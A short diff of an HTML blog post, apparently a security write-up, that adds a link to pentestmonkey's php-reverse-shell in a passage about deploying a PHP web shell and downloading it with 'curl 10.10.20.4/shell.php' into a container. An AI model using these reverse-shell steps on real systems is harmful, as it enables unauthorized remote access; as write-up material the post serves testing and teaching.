@@ -354,7 +354,7 @@ $ cat zz-hardening.ini
                             <img src="../images/Posts/Latest-Was-A-Lie/19.png" alt="">
                         </div>
                         <p>With these restrictions removed, we were able to deploy a PHP web shell.</p>
-                        <p>We navigated to /var/www/default and uploaded a reverse shell (php-reverse-shell in this case). After configuring it with our IP and port, we hosted it locally and downloaded it into the container:</p>
+                        <p>We navigated to /var/www/default and uploaded a reverse shell (<a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">php-reverse-shell</a> from pentestmonkey in this case). After configuring it with our IP and port, we hosted it locally and downloaded it into the container:</p>
                         <div class="console-code">
                             <pre>
 $ curl 10.10.20.4/shell.php -O
